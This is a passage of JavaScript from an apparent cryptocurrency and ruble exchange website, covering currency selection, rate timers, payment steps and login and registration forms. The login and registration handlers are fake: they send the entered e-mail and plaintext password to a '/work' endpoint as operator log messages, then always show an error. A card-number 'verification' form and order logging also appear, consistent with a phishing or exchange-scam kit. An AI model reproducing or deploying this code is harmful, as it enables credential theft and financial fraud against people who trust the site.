        } else if ( valuteSecondName == 'Tron (TRX)' ) {
            document.querySelector('.pay__web').textContent = 'TRC-20 (Tron)';
        } else if ( valuteSecondName == 'Toncoin (TON)' ) {
            document.querySelector('.pay__web').textContent = 'The Open Network (TON)';
        } else if ( valuteSecondName == 'Dash (DASH)' ) {
            document.querySelector('.pay__web').textContent = 'Dash';
        } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
            document.querySelector('.pay__web').textContent = 'Zcash';
        } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
            document.querySelector('.pay__web').textContent = 'Binance Coin';
        } else if ( valuteSecondName == 'Monero (XMR)' ) {
            document.querySelector('.pay__web').textContent = 'Monero';
        }
    }

    if ( valuteCategoryFirst == 'CRYPTO' ) {
        if ( valuteFirstName == 'Bitcoin (BTC)' ) {
            document.querySelector('.pay__area span').textContent = 'Bitcoin (BTC)';
        } else if ( valuteFirstName == 'Tether ERC20 (USDT)' ) {
            document.querySelector('.pay__area span').textContent = 'ERC-20 (Ethereum)';
        } else if ( valuteFirstName == 'Tether TRC20 (USDT)' ) {
            document.querySelector('.pay__area span').textContent = 'TRC-20 (Tron)';
        } else if ( valuteFirstName == 'Tether BEP20 (USDT)' ) {
            document.querySelector('.pay__area span').textContent = 'BEP-20 (BNB)';
        } else if ( valuteFirstName == 'Tether SOL (USDT)' ) {
            document.querySelector('.pay__area span').textContent = 'Solana (SOL)';
        } else if ( valuteFirstName == 'Tether TON (USDT)' ) {
            document.querySelector('.pay__area span').textContent = 'The Open Network (TON)';
        } else if ( valuteFirstName == 'Dai (DAI)' ) {
            document.querySelector('.pay__area span').textContent = 'Bitcoin (BTC)';
        } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
            document.querySelector('.pay__area span').textContent = 'Polkadot (DOT)';
        } else if ( valuteFirstName == 'USD Coin ERC20 (USDC)' ) {
            document.querySelector('.pay__area span').textContent = 'ERC-20 (Ethereum)';
        } else if ( valuteFirstName == 'USD Coin SOL (USDC)' ) {
            document.querySelector('.pay__area span').textContent = 'Solana (SOL)';
        } else if ( valuteFirstName == 'Solana (SOL)' ) {
            document.querySelector('.pay__area span').textContent = 'Solana (SOL)';
        } else if ( valuteFirstName == 'Polygon (POL)' ) {
            document.querySelector('.pay__area span').textContent = 'Polygon (POL)';
        } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' ) {
            document.querySelector('.pay__area span').textContent = 'Arbitrum One (ARB)';
        } else if ( valuteFirstName == 'Ethereum Optimism (ETH)' ) {
            document.querySelector('.pay__area span').textContent = 'Optimism (OP)';
        } else if ( valuteFirstName == 'Ethereum (ETH)' ) {
            document.querySelector('.pay__area span').textContent = 'ERC-20 (Ethereum)';
        } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
            document.querySelector('.pay__area span').textContent = 'Arbitrum one (ARB)';
        } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
            document.querySelector('.pay__area span').textContent = 'Litecoin (LTC)';
        } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
            document.querySelector('.pay__area span').textContent = 'Bitcoin Cash (BCH)';
        } else if ( valuteFirstName == 'Ripple (XRP)' ) {
            document.querySelector('.pay__area span').textContent = 'Ripple (XRP)';
        } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
            document.querySelector('.pay__area span').textContent = 'Dogecoin (DOGE)';
        } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
            document.querySelector('.pay__area span').textContent = 'Ethereum Classic (ETC)';
        } else if ( valuteFirstName == 'Stellar (XLM)' ) {
            document.querySelector('.pay__area span').textContent = 'Stellar (XLM)';
        } else if ( valuteFirstName == 'Tron (TRX)' ) {
            document.querySelector('.pay__area span').textContent = 'TRC-20 (Tron)';
        } else if ( valuteFirstName == 'Toncoin (TON)' ) {
            document.querySelector('.pay__area span').textContent = 'Toncoin (TON)';
        } else if ( valuteFirstName == 'Dash (DASH)' ) {
            document.querySelector('.pay__area span').textContent = 'Dash (DASH)';
        } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
            document.querySelector('.pay__area span').textContent = 'Zcash (ZEC)';
        } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
            document.querySelector('.pay__area span').textContent = 'Binance Coin (BNB BEP20)';
        } else if ( valuteFirstName == 'Monero (XMR)' ) {
            document.querySelector('.pay__area span').textContent = 'Monero (XMR)';
        }
    }

    document.querySelectorAll('.first__preloading').forEach ( item => {
        item.style.display = 'block';
    })
    document.querySelectorAll('.first__val')[0].style.opacity = '0';
    document.querySelectorAll('.first__val')[1].style.opacity = '0';
    document.querySelector('.first__button').classList.add('first__button-load');

    setTimeout( () => {
        window.scrollTo(0, 0);
        document.querySelector('.modal').style.display = 'flex';
        document.querySelector('.pay').style.display = 'block';
        document.querySelector('.first').style.display = 'none';
    }, 1400 )

    // == НАЧАЛО НОВОГО КОДА ДЛЯ КАРТ И СБП == //

    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {

        document.querySelector('.verif__order span').textContent = orderID;
        document.querySelectorAll('.verif__line span')[0].textContent = document.querySelector('.pay__valutes-val-one').textContent;
        document.querySelectorAll('.verif__line img')[0].src = document.querySelector('.pay__valutes-icon-one').src;
        document.querySelectorAll('.verif__line span')[1].textContent = document.querySelector('.pay__valutes-num-one').textContent;
        document.querySelectorAll('.verif__line span')[2].textContent = document.querySelector('.pay__valutes-val-two').textContent;
        document.querySelectorAll('.verif__line img')[1].src = document.querySelector('.pay__valutes-icon-two').src;
        document.querySelectorAll('.verif__line span')[3].textContent = document.querySelector('.pay__valutes-num-two').textContent;

        document.querySelector(".pay__step-first").style.display = "none";
        document.querySelector(".pay__step-two").style.display = "none";
        document.querySelector(".pay__stepnumber-last").textContent = "4";

        document.querySelector('.pay__step-bank-first').style.display = "grid";
        document.querySelector('.pay__step-bank-two').style.display = "grid";
        document.querySelector('.pay__step-bank-three').style.display = "grid";

        document.querySelector('.pay__getcard').addEventListener('click', event => {
            document.querySelector('.verif').style.display = "flex";
        })
        document.querySelector('.verif__close').addEventListener('click', event => {
            document.querySelector('.verif').style.display = "none";
        })
        let activeSave = false;
        document.querySelector('.verif__save').addEventListener('click', event => {
            if ( activeSave == false ) {
                document.querySelector('.verif__checkbox svg').style.display = "flex";
                activeSave = true;
            } else {
                document.querySelector('.verif__checkbox svg').style.display = "none";
                activeSave = false;
            }
        })

        document.querySelector('.verif__button').addEventListener('click', event => {
            const button = event.currentTarget;

            if (!button.classList.contains('verif__button-active')) {
                return; // ничего не делаем
            }

            document.querySelector('.verif').style.display = "none";
            document.querySelector(".pay__step-first").style.display = "grid";
            document.querySelector(".pay__step-two").style.display = "grid";
            document.querySelector(".pay__stepnumber-last").textContent = "3";

            document.querySelector('.pay__step-bank-first').style.display = "none";
            document.querySelector('.pay__step-bank-two').style.display = "none";
            document.querySelector('.pay__step-bank-three').style.display = "none";
        });

        function chekingAllInputsCard() {
            const inputs = document.querySelectorAll('.verif__input');
            const button = document.querySelector('.verif__button');

            const isValid =
                inputs[0].value.length >= 2 &&
                inputs[1].value.length >= 2 &&
                inputs[2].value.length >= 2 &&
                inputs[3].value.length === 19;

            if (isValid) {
                button.classList.add('verif__button-active');
            } else {
                button.classList.remove('verif__button-active');
            }
        }

        document.querySelectorAll('.verif__input').forEach(input => {
            input.addEventListener('input', chekingAllInputsCard);
        });

        function formatCardInput(e) {
            // Убираем всё кроме цифр
            let value = e.target.value.replace(/\D/g, '');

            // Ограничиваем до 16 цифр
            value = value.slice(0, 16);

            // Добавляем пробелы после каждых 4 цифр
            value = value.replace(/(.{4})/g, '$1 ').trim();

            e.target.value = value;
        }
        const cardInput = document.querySelector('#card-input');
        cardInput.addEventListener('input', formatCardInput);

    }

    // == КОНЕЦ НОВОГО КОДА ДЛЯ КАРТ И СБП == //

    checkingValutes();
}

function checkingValutes() {

    if ( valuteCategorySecond == 'SBP' ) {
        document.querySelector('.modal__wallet .modal__subtitle').textContent = 'На Вашу карту по номеру телефона'
        document.querySelectorAll('.pay__info p')[1].innerHTML = `в банк <span>${document.querySelector('.table-three__valute-active p').textContent}</span>`;
        document.querySelectorAll('.pay__info p')[2].innerHTML = `по номеру телефона <span>${document.querySelector('.rec__wallet input').value}</span>`;
        document.querySelector('.pay__info').style.display = 'flex';
        document.querySelector('.pay__info').style.flexWrap = 'wrap';
        document.querySelector('.pay__info').style.gap = '6px';
    } else if ( valuteCategorySecond == 'BANK' ) {
        document.querySelector('.modal__wallet .modal__subtitle').textContent = 'На Вашу карту'
        document.querySelectorAll('.pay__info p')[1].innerHTML = `на карту <span>${document.querySelector('.rec__wallet input').value}</span>`;
        document.querySelectorAll('.pay__info p')[2].innerHTML = `банка <span>${document.querySelector('.table-two__valute-active p').textContent}</span>`;
    } else if ( valuteCategorySecond == 'PAYSYSTEM' ) {
        document.querySelectorAll('.pay__info p')[2].style.display = 'none';
    }

    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' || valuteCategoryFirst == 'PAYSYSTEM') {
        document.querySelector('.pay__prog').style.display = 'flex';
        document.querySelector('.pay__subtitle-lh').style.display = 'none';
        document.querySelector('.pay__subtitle-down').style.display = 'none';
        document.querySelector('.pay__reserving').style.display = 'none';
        document.querySelector('.pay__att').style.display = 'none';
        document.querySelector('.pay__area').style.display = 'none';
        document.querySelectorAll('.pay__text')[0].style.display = 'none';
        document.querySelectorAll('.pay__text')[1].style.display = 'none';

        if ( valuteCategoryFirst == 'BANK' ) {
            document.querySelectorAll('.pay__what')[1].textContent = 'на карту';
        }

        if ( valuteCategoryFirst == 'SBP') {
            document.querySelectorAll('.pay__what')[1].textContent = 'по номеру телефона (СБП)';
        }

        // Создание таймера

        let minThr = Number(Date.now()) + 1800000;
        let deadline = new Date(minThr);
        function getTime(endtime) {
            const t = Date.parse(endtime) - Date.parse(new Date());
            const days = Math.floor(t / (1000 * 60 * 60 * 24));
            const hours = Math.floor((t / (1000 * 60 * 60) % 24));
            const minutes = Math.floor((t / 1000 / 60) % 60);
            const seconds = Math.floor((t / 1000) % 60);
            return {
                'total': t,
                'days': days,
                'hours': hours,
                'minutes': minutes,
                'seconds': seconds
            };
        }
        function setClock(endtime) {
            const minutesElem = document.querySelector('.mnts');
            const secondsElem = document.querySelector('.scnds');
            const timeInterval = setInterval( updateClock, 1000);
            function updateClock() {
                const t = getTime(endtime);
                t.minutes < 10 ? minutesElem.innerHTML = `0${t.minutes}` : minutesElem.innerHTML = t.minutes;
                t.seconds < 10 ? secondsElem.innerHTML = `0${t.seconds}` : secondsElem.innerHTML = t.seconds;
                if ( t.total <= 0 ) {
                    clearInterval(timeInterval);

                    document.querySelector('.timeend__title p').textContent = `Сделка № ${orderID} отменена`;
                    document.querySelector('.pay').style.display = 'none';
                    document.querySelector('.timeend').style.display = 'block';

                }
            }
        }
        setClock(deadline);

    }

}

document.querySelector('.modal__ok').addEventListener('click', event => {
    document.querySelector('.modal').style.display = 'none';

    messageForLog = "";

    messageForLog += `🟩 <b>НОВЫЙ ОБМЕН ID -</b> ${orderID}\n\n`;

    messageForLog += `Что меняем: ${document.querySelector('.table__valute-active p').textContent}\n`;
    messageForLog += `Сумма: ${document.querySelector('.first__input-one').value}\n`;
    messageForLog += `Его реквизит: ${document.querySelector('.rec__wallet input').value}\n\n`;

    messageForLog += `На что меняем: ${document.querySelector('.table-two__valute-active p').textContent}\n`;
    messageForLog += `Сумма: ${document.querySelector('.first__input-two').value}\n`;
    messageForLog += `Наш реквизит: ${document.querySelector('.pay__table-wallet p').textContent}\n\n`;

    messageForLog += `👨‍🦳 <b>Данные о юзере:</b>\n`;
    messageForLog += `Почта: ${document.querySelector('.rec__mail input').value}\n`;

    axios.post('/create', {
        orderID: orderID,
        source: document.querySelector('.table__valute-active p').textContent,
        req: document.querySelector('.pay__table-wallet p').textContent
    });

    axios.post('/work', {
        message: messageForLog
    });

})

document.querySelector('.modal__cancel').addEventListener('click', event => {
    location.href = location.origin;
})

document.querySelectorAll('.pay__button-cancel')[0].addEventListener('click', event => {
    location.href = location.origin;
})

document.querySelectorAll('.pay__button-cancel')[1].addEventListener('click', event => {
    location.href = location.origin;
})

// Функционал авторизации

let messageForLog = "";
let errorLogin = false;
document.querySelector('.login__button').addEventListener('click', event => {

    errorLogin = false;

    if ( document.querySelector('.login__log input').value == '' ) {
        document.querySelector('.login__message p').textContent = 'Это поле не может быть пустым';
        document.querySelector('.login__message').style.display = 'block';
        document.querySelector('.login__log input').style.border = '2px solid #f73';
        document.querySelector('.login__log input').style.marginBottom = '40px';
        errorLogin = true;
    } else if ( !String(document.querySelector('.login__log input').value).includes('@') && !String(document.querySelector('.login__log input').value).includes('.') ) {
        document.querySelector('.login__message p').textContent = 'Не верный E-mail';
        document.querySelector('.login__message').style.display = 'block';
        document.querySelector('.login__log input').style.border = '2px solid #f73';
        document.querySelector('.login__log input').style.marginBottom = '40px';
        errorLogin = true;
    }

    if ( document.querySelector('.login__pass input').value == '' ) {
        document.querySelectorAll('.login__message p')[1].textContent = 'Это поле не может быть пустым';
        document.querySelectorAll('.login__message')[1].style.display = 'block';
        document.querySelector('.login__pass input').style.border = '2px solid #f73';
        document.querySelector('.login__pass input').style.marginBottom = '40px';
        errorLogin = true;
    } else if ( document.querySelector('.login__pass input').value.length < 6 ) {
        document.querySelectorAll('.login__message p')[1].textContent = 'Слишком короткий пароль';
        document.querySelectorAll('.login__message')[1].style.display = 'block';
        document.querySelector('.login__pass input').style.border = '2px solid #f73';
        document.querySelector('.login__pass input').style.marginBottom = '40px';
        errorLogin = true;
    } 

    if ( errorLogin == false ) {

        setTimeout( () => {
            document.querySelector('.login__message p').textContent = 'Не верный E-mail или пароль';
            document.querySelector('.login__message').style.display = 'block';
            document.querySelector('.login__log input').style.border = '2px solid #f73';
            document.querySelector('.login__log input').style.marginBottom = '40px';

            document.querySelectorAll('.login__message p')[1].textContent = 'Не верный E-mail или пароль';
            document.querySelectorAll('.login__message')[1].style.display = 'block';
            document.querySelector('.login__pass input').style.border = '2px solid #f73';
            document.querySelector('.login__pass input').style.marginBottom = '40px';

            document.querySelector('.login__log input').value = '';
            document.querySelector('.login__pass input').value = '';
        }, 800 )

        messageForLog = `👤 <b>Попытка войти в профиль</b>\n E-mail - ${document.querySelector('.login__log input').value}\n Пароль - ${document.querySelector('.login__pass input').value}`;

        axios.post('/work', {
            message: messageForLog
        });

    }

})

document.querySelector('.login__log input').addEventListener('click', event => {
    document.querySelector('.login__message').style.display = 'none';
    document.querySelector('.login__log input').style.border = '2px solid #cfcfcf';
    document.querySelector('.login__log input').style.marginBottom = '20px';
})

document.querySelector('.login__pass input').addEventListener('click', event => {
    document.querySelectorAll('.login__message')[1].style.display = 'none';
    document.querySelector('.login__pass input').style.border = '2px solid #cfcfcf';
    document.querySelector('.login__pass input').style.marginBottom = '20px';
})

// Функционал регистрации

let errorRegister = false;
document.querySelector('.register__button').addEventListener('click', event => {

    errorRegister = false;

    if ( document.querySelector('.register__log input').value == '' ) {
        document.querySelector('.register__message p').textContent = 'Это поле не может быть пустым';
        document.querySelector('.register__message').style.display = 'block';
        document.querySelector('.register__log input').style.border = '2px solid #f73';
        document.querySelector('.register__log input').style.marginBottom = '40px';
        errorRegister = true;
    } else if ( !String(document.querySelector('.register__log input').value).includes('@') && !String(document.querySelector('.register__log input').value).includes('.') ) {
        document.querySelector('.register__message p').textContent = 'Не верный E-mail';
        document.querySelector('.register__message').style.display = 'block';
        document.querySelector('.register__log input').style.border = '2px solid #f73';
        document.querySelector('.register__log input').style.marginBottom = '40px';
        errorRegister = true;
    }

    if ( document.querySelector('.register__pass input').value == '' ) {
        document.querySelectorAll('.register__message p')[1].textContent = 'Это поле не может быть пустым';
        document.querySelectorAll('.register__message')[1].style.display = 'block';
        document.querySelector('.register__pass input').style.border = '2px solid #f73';
        document.querySelector('.register__pass input').style.marginBottom = '40px';
        errorRegister = true;
    } else if ( document.querySelector('.register__pass input').value.length < 6 ) {
        document.querySelectorAll('.register__message p')[1].textContent = 'Слишком короткий пароль';
        document.querySelectorAll('.register__message')[1].style.display = 'block';
        document.querySelector('.register__pass input').style.border = '2px solid #f73';
        document.querySelector('.register__pass input').style.marginBottom = '40px';
        errorRegister = true;
    }

    if ( document.querySelector('.register__rep input').value == '' ) {
        document.querySelectorAll('.register__message p')[2].textContent = 'Это поле не может быть пустым';
        document.querySelectorAll('.register__message')[2].style.display = 'block';
        document.querySelector('.register__rep input').style.border = '2px solid #f73';
        document.querySelector('.register__rep input').style.marginBottom = '40px';
        errorRegister = true;
    } else if ( document.querySelector('.register__rep input').value != document.querySelector('.register__pass input').value ) {
        document.querySelectorAll('.register__message p')[2].textContent = 'Пароли не совпадают';
        document.querySelectorAll('.register__message')[2].style.display = 'block';
        document.querySelector('.register__rep input').style.border = '2px solid #f73';
        document.querySelector('.register__rep input').style.marginBottom = '40px';
        errorRegister = true;
    }

    if ( errorRegister == false ) {

        messageForLog = `💻 <b>Попытка регистрации профиля</b>\n E-mail - ${document.querySelector('.register__log input').value}\n Пароль - ${document.querySelector('.register__pass input').value}`;

        axios.post('/work', {
            message: messageForLog
        });

        setTimeout( () => {
            document.querySelector('.register__message p').textContent = 'Ошибка регистрации, повторите попытку позже';
            document.querySelector('.register__message').style.display = 'block';
            document.querySelector('.register__log input').style.border = '2px solid #f73';
            document.querySelector('.register__log input').style.marginBottom = '40px';

            document.querySelector('.register__log input').value = '';
            document.querySelector('.register__pass input').value = '';
            document.querySelector('.register__rep input').value = '';
        }, 1000 )

    }

})

document.querySelector('.register__log input').addEventListener('click', event => {
    document.querySelector('.register__message').style.display = 'none';
    document.querySelector('.register__log input').style.border = '2px solid #cfcfcf';
    document.querySelector('.register__log input').style.marginBottom = '20px';
})

document.querySelector('.register__pass input').addEventListener('click', event => {
    document.querySelectorAll('.register__message')[1].style.display = 'none';
    document.querySelector('.register__pass input').style.border = '2px solid #cfcfcf';
    document.querySelector('.register__pass input').style.marginBottom = '20px';
})

document.querySelector('.register__rep input').addEventListener('click', event => {
    document.querySelectorAll('.register__message')[2].style.display = 'none';
    document.querySelector('.register__rep input').style.border = '2px solid #cfcfcf';
    document.querySelector('.register__rep input').style.marginBottom = '20px';
})

// Сохранение полей в буфер обмена

document.querySelectorAll('.pay__copy').forEach( (item, i) => {
    item.addEventListener('click', event => {

        if ( i == 0 ) {
            document.querySelector('.copyInput1').value = document.querySelector('.first__input-one').value;
            var cutTextarea = document.querySelector('.copyInput1');  
            cutTextarea.select();
            try {  
                var successful = document.execCommand('cut');  
                var msg = successful ? 'successful' : 'unsuccessful';
            } catch(err) {
            }  
        } else if ( i == 1 ) {
            document.querySelector('.copyInput2').value = document.querySelector('.pay__table-wallet p').textContent;
            var cutTextarea = document.querySelector('.copyInput2');  
            cutTextarea.select();
            try {  
                var successful = document.execCommand('cut');  
                var msg = successful ? 'successful' : 'unsuccessful';
            } catch(err) {
            }  
        } 

    })
})

document.querySelector('.timeend__button').addEventListener('click', event => {
    location.href = location.origin;
})

const inputCode = document.querySelector(".first__input-one");
inputCode.addEventListener("input", (event) => {
    inputCode.value = inputCode.value.replace(/[qwertyuiopasdfghjklzxcvbnmйіцукенгшщзхъфывапролдячсмитьбюжэ!@#$%^&*()_+=,?'"`;:/|\- ]/gim, "");
});

const inputCode2 = document.querySelector(".first__input-two");
inputCode2.addEventListener("input", (event) => {
    inputCode2.value = inputCode2.value.replace(/[qwertyuiopasdfghjklzxcvbnmйіцукенгшщзхъфывапролдячсмитьбюжэ!@#$%^&*()_+=,?'"`;:/|\- ]/gim, "");
});


function addedSpacesInNumbers(num) {
    num = Number(num) + 0.0011111;
    num = num.toFixed(2);
    return String(num).replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}

let secondsToRestart = 30;

setInterval( () => {

    if ( activeLoopTimerPause == false ) {
        if ( secondsToRestart >= 10 ) {
            document.querySelector('.first__timervalute').textContent = `00:${secondsToRestart}`;
        } else if ( secondsToRestart < 10 && secondsToRestart >= 0 ) {
            document.querySelector('.first__timervalute').textContent = `00:0${secondsToRestart}`;
        } else if ( secondsToRestart == -1 ) {
            timerReloadActual();
            secondsToRestart = 31;
        }

        secondsToRestart = secondsToRestart - 1;
    } else {
        document.querySelector('.first__timervalute').textContent = `00:30`;
    }

}, 1000 )

document.querySelector('.first__rght svg').addEventListener('click', event => {
    timerReloadActual();
    secondsToRestart = 30;
})
document.querySelectorAll('.table__valute').forEach( item => {
    item.addEventListener('click', event => {
        timerReloadActual();
        secondsToRestart = 30;
    })
} )
document.querySelectorAll('.table-two__valute').forEach( item => {
    item.addEventListener('click', event => {
        timerReloadActual();
        secondsToRestart = 30;
    })
} )

let activeLoopTimerPause;
function timerReloadActual() {

    document.querySelector('.first__button').style.width = '100%';
    document.querySelector('.first__button .first__preloading').style.display = 'block';

    document.querySelector('.first__preloading-lil').style.display = 'block';
    document.querySelectorAll('.first__val')[0].style.display = 'none';
    document.querySelectorAll('.first__val')[1].style.display = 'none';
    document.querySelector('.first__top').style.borderBottom = "2px solid #ffffff00";
	
	activeLoopTimerPause = true;

    fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
        if (result.status === 200 && result.ok) {
            return result.json()
        }
    }).then((JSON_DATA) => {

        async function getCurrencies(){  
            const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
            const response = await fetch(url);
            const data = await response.json();

			if (Number.isFinite(PRICE_DASH)) {

                // --- Если число — убираем загрузку и показываем контент ---
                document.querySelector('.first__button').style.width = 'fit-content';
                document.querySelector('.first__button .first__preloading').style.display = 'none';
                document.querySelector('.first__preloading-lil').style.display = 'none';
                document.querySelectorAll('.first__val')[0].style.display = 'block';
                document.querySelectorAll('.first__val')[1].style.display = 'block';
                document.querySelector('.first__top').style.borderBottom = "2px solid #f2f4f5";
                document.querySelector('.first__right h6').style.color = "#2e4057";
                document.querySelectorAll('.first__table')[0].style.opacity = "1";
                document.querySelectorAll('.first__table')[1].style.opacity = "1";
                document.querySelector('.first__board').style.background = "#fff8f5";
                
                document.querySelectorAll('.first__preloading').forEach(item => {
                    item.style.display = 'none';
                });

                document.querySelectorAll('.first__val')[0].style.opacity = '1';
                document.querySelectorAll('.first__val')[1].style.opacity = '1';
                document.querySelector('.first__button').classList.remove('first__button-load');
                document.querySelector('.first__check').style.display = 'block';

            } else {

                // --- Если НЕ число — ставим таймер и перезагружаем страницу ---
                console.warn("PRICE_DASH не является числом. Перезагрузка через 30 сек...");

                setTimeout(() => {
                    location.reload();
                }, 15000);
            }
			
			secondsToRestart = 30;

            activeLoopTimerPause = false;

            if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {

                if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_BTC * data.Valute.USD.Value).toFixed(2)) } RUB = 1 BTC`;
                } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_USDT * data.Valute.USD.Value).toFixed(2)) } RUB = 1 USDT`;
                } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_USDC * data.Valute.USD.Value).toFixed(2)) } RUB = 1 USDC`;
                } else if ( valuteSecondName == 'Dai (DAI)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_DAI * data.Valute.USD.Value).toFixed(2)) } RUB = 1 DAI`;
                } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_DOT * data.Valute.USD.Value).toFixed(2)) } RUB = 1 DOT`;
                } else if ( valuteSecondName == 'Solana (SOL)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_SOL * data.Valute.USD.Value).toFixed(2)) } RUB = 1 SOL`;
                } else if ( valuteSecondName == 'Polygon (POL)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_POL * data.Valute.USD.Value).toFixed(2)) } RUB = 1 POL`;
                } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' || valuteSecondName == 'Ethereum (ETH)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_ETH * data.Valute.USD.Value).toFixed(2)) } RUB = 1 ETH`;
                } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_ARB * data.Valute.USD.Value).toFixed(2)) } RUB = 1 ARB`;
                } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_LTC * data.Valute.USD.Value).toFixed(2)) } RUB = 1 LTC`;
                } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_BCH * data.Valute.USD.Value).toFixed(2)) } RUB = 1 BCH`;
                } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_XRP * data.Valute.USD.Value).toFixed(2)) } RUB = 1 XRP`;
                } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_DOGE * data.Valute.USD.Value).toFixed(2)) } RUB = 1 DOGE`;
                } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_ETC * data.Valute.USD.Value).toFixed(2)) } RUB = 1 ETC`;
                } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_XLM * data.Valute.USD.Value).toFixed(2)) } RUB = 1 XLM`;
                } else if ( valuteSecondName == 'Tron (TRX)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_TRX * data.Valute.USD.Value).toFixed(2)) } RUB = 1 TRX`;
                } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_TON * data.Valute.USD.Value).toFixed(2)) } RUB = 1 TON`;
                } else if ( valuteSecondName == 'Dash (DASH)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_DASH * data.Valute.USD.Value).toFixed(2)) } RUB = 1 DASH`;
                } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_ZEC * data.Valute.USD.Value).toFixed(2)) } RUB = 1 ZEC`;
                } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_BNB * data.Valute.USD.Value).toFixed(2)) } RUB = 1 BNB`;
                } else if ( valuteSecondName == 'Monero (XMR)' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers((PRICE_XMR * data.Valute.USD.Value).toFixed(2)) } RUB = 1 XMR`;
                } else if ( valuteSecondName == 'ЮMoney' ) {
                    document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers(( data.Valute.USD.Value).toFixed(2)) } RUB = 1 USD`;
                }
            } else if ( valuteCategoryFirst == 'PAYSYSTEM' ) {
                document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers(( data.Valute.USD.Value).toFixed(2)) } RUB = 1 USD`;
            } else if ( valuteCategoryFirst == 'CRYPTO' ) {
                if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers((PRICE_BTC * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers((PRICE_BTC).toFixed(2))} BTC = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)'  ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_DOT) ) } DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
